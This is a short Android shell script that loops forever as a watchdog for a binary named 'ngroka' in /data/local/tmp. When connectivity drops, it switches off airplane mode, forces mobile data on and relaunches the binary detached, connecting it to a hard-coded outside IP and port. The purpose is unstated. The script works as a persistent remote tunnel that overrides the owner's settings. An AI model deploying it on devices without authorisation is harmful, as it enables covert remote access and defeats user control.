

while true
do
x=0
process=`ps -A | grep ngroka`
connectivity=`ping -q -c 1 -W 1 8.8.8.8`
sleep 10
if [ "$connectivity" == "" ]
then

		if [ "$process" != "" ]
		then
			killall ngroka
		fi
		airplane=`cmd connectivity airplane-mode`

		if [ "$airplane" == "enabled" ]
		then 
		svc data disable
		cmd connectivity airplane-mode disable
		killall ngroka
		sleep 20
		fi

		svc data enable
		sleep 10		
		HOME="/data/local/tmp/"
		chmod +x /data/local/tmp/ngroka
		(setsid /data/local/tmp/ngroka -e 52.66.8.185:$fwdport &)

fi
done
